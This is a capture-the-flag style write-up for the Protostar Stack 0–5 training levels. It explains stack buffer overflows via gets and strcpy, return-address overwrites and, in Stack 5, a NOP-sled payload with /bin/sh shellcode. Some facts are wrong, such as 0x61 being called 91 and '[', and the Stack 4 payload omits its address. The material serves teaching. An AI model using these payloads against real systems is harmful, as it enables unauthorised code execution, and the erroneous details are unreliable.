# Protostar Stack levels

## Stack 0
For this level we have to exploit the following C code.

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)  
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
    printf("you have changed the 'modified' variable\n");
  } else {
    printf("Try again?\n");
  }
}
```

As we can see here. The main function is calling `gets()`.
Running `man gets` we see it is a C library function which reads a line from standard input and stores the string inside the supplied buffer.
The man page also warns that gets does not check for the size of the string! 

The program starts by initialising the stack. The stack looks like this. 
```C
+==============+
|    Data      |
+--------------+
|   modified   |
+--------------+
|  buffer[64]  |
+--------------+
|    Data      |
+==============+
```
Since this a 32 bit system, modified will be 4 bytes (32 bits = 4 bytes). So we can type 1 to 4 characters to overwrite it.
The modified variable is right above the buffer, we need to write 64 characters to fill the buffer, then 1 character to change modified.

We can do this with a nice little python script: Piping the followning output into the program will overwrite the modified variable
```python
print 'A'*64 + 'BBBB'
```


## Stack 1

Here is the supplied C Code
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)  
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
    errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
    printf("you have correctly got the variable to the right value\n");
  } else {
    printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Stack1 is very similar to Stack0, however now we have to write a specific value into the buffer. Specifically 0x61626364
This is a hex number, 0x61 = 91. 

Let's take a step back and talk about *endianness*. Computers are really lazy.
Modern computers store data in many ways. The most common is in a format called **little endian**.
Little endian stores the least significant byte first. This means that if you wanted to store the binary number *01101001*, it would be stored as *01101001*. But if you wanted to store a 4 byte word, (0xFF = 11111111, 0x00 = 00000000), In memory storing **0x123456** would look like **0x563412**. Little endianness changes the location of entire *bytes*, not the *bits*.

This challenge is extremely similar to Stack 0. But in order to get the number *0x61626364* to appear correctly, we would have to enter it in a little endian manner. This means enterring **0x64636261**.

The program is expecting characters not numbers, so we have to convert each byte, into a character. For example 0x61 = *[*.
But this is annoying to do, python has a nice short hand to doing it, if you just `print '\x61'` it will print [. 

So similar to Stack 0, we can use the following python script to print our attack
```python
print "A"*64 + "\x64\x63\x62\x61"
```
To pipe this input into our program we can do `python -c 'print "A"*64 + "\x64\x63\x62\x61"' | ./stack1`

## Stack 2

Supplied C Code is
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)  
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
    errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
    printf("you have correctly modified the variable\n");
  } else {
    printf("Try again, you got 0x%08x\n", modified);
  }

}
```

Reading through this program source, we get some idea of what is happening.
The program is calling `getenv` with **GREENIE** as a parameter. If this is *NULL*, it exits, but if it isn't *NULL*, it copies it into a buffer.
When you think about it, this isn't really different from Stack 1. This is just a new form of input. We can control things like the environment variables with the unix command `export`

Like before we want to take into account the endianness of the computer. So we will enter 64 characters to fill the buffer, and then *0x0d0a0d0a* backwards -> *0x0a0d0a0d*.

We can use a python script to generate the string
```python
python -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")'
```
We can run this python script inline, using backticks \` \`.
So if we run ```export GREENIE = `python -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")` ```
Then execute the program. We win!

## Stack 3

The provided code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()  
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)  
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);
`
  if(fp) {
    printf("calling function pointer, jumping to 0x%08x\n", fp);
    fp();
  }
}
```

This level starts to introduce the idea about code redirection, and possible *remote code execution*.

Let's first see what this program does.
It starts by defining two variables. A function pointer, and an array of characters. We already know from earlier levels that we can easily overwrite values on the stack with the `gets` call. But this time there is no check to see if we set the variable correctly. 

How do function pointers work?
If we declare a function pointer `int (*fp)();`, it will (in a 32 bit machine) take **4** bytes of storage, just like an int. However when we call `fp()`, It will treat the value stored in memory as an address, and jump to that address, and execute any code stored at that address.

So what address should we jump to?
Well we want the code at `win()` to execute, so let's find the address of that in the binary file, and then jump to that!

Firstly to find the address of any label *(win, main, are called labels)* we need to use a program called objdump.
`objdump -t ./stack3 | grep win`
The -t parameter means only print out the addresses of functions/global variables, not the actual code. 
We pipe the output of this into grep, and search for any lines containing 'win'

This returns win at the address **0x8048424**

This address is just a number. Now that we have a number to overwrite, this level becomes the same as previous levels.
```python
python -c 'print "A"*64 + "\x24\x84\x04\x08"'
```
Remember *little endianness*


## Stack 4

Program source is supplied:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()  
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)  
{
  char buffer[64];

  gets(buffer);
}
```
Finally, a real challenge. 
From a first glance this code looks perfectly fine, What could we possibly overwrite to get a jump into the `win` function.

In Stack 0 I explained how the stack looks, how does it look here?
```C
+==============+
|    Data      |
+--------------+
|  buffer[64]  |
+--------------+
|    Data      |
+==============+
```
What is that `Data`?
Data has a bunch of information on the current *stack frame*, including a base pointer, and our **return address**.

If we could override the return address of the stack frame, we could change where the function *returns* to.

Firstly we need to use `objdump` to find the address of **win** again.
Running `objdump ... | grep win` yields **0x80483f4**

Now we need to know how many bytes to override. We need to override the buffer which is 64 bytes, however the compiler will include random bytes to align the stack correctly. So we can trial and error how many letters to input before our program crashes.

If we enter 80 letter A's it crashes, if we enter 75 it won't crash, if we enter 76 it does. So we have 76 bytes to override before our program seg faults, and crashes.

Similar to before, we can compile a python script to output this data
```python
python -c 'print("A"*76 + "")'
```

## Stack 5

Provided code
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)  
{
  char buffer[64];

  gets(buffer);
}
```

Now we know we can force the program to jump to code anywhere in the program, but where should we jump this time?
To break this challenge, we are going to need to inject our own shellcode into the program, and jump to it manually

shellcode = *`\x6a\x0b\x58\x99\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`*
This was taken from shell-storm. We know the architecture is a 32 bit linux system, this shell code executes /bin/sh

One place we can put this shellcode is in the buffer, its **21**)) bytes, so if we pad the buffer with random data before it, it should work!

So let's craft our payload
Like before, we will need to pad our payload to **76** bytes before our return address. 
This is where we introduce a nopsled. **0x90** is an intel command that means _do nothing, go to next command_. So if we just fill our buffer with these, followed by our shellcode, and if we jump to the middle our buffer, it will slide down our nops, into our shellcode. And then pop a shell.

But what address do we want to jump to? 
**ASLR** stands for Address Space Layout Randomisation, thankfully it isn't enabled on this sytem, so we can find where the stack is.

To do this we can open the program in gdb, and enter AAAAAAAAA.... 
Now when the program crashes, we can examine the stack by typing `x/64x $esp`

This command does a few things. the x stands for *examine* and is used to examine memory in the stack.
The 64 is how many words (4 bytes) we want to display, and the x stands for hexadecimal, and sets the output format to print out the memory as hex numbers. The $esp is the starting address for the printing. **$esp** is the *stack pointer* register, and contains an address to the beginning of the stack.

```
0xbffff7a0:	0xbffff7b0	0xb7ec6165	0xbffff7b8	0xb7eada75
0xbffff7b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff7c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff7d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff7e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff7f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff800:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff810:	0x41414141	0xffffff00	0xb7ffeff4	0x08048232
```
This output is shown so the left column is the address, and right right column is the data, spread in 4 byte segmants
As we can see, our buffer starts at 0xbffff7b0. This is where our shellcode will be, so we can set this address as our return address.


```python
payload += '\x90' * (76 - 21)
payload += '\x6a\x0b\x58\x99\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
payload += '\xb0\xf7\xff\xbf'

print payload
```

Boom shell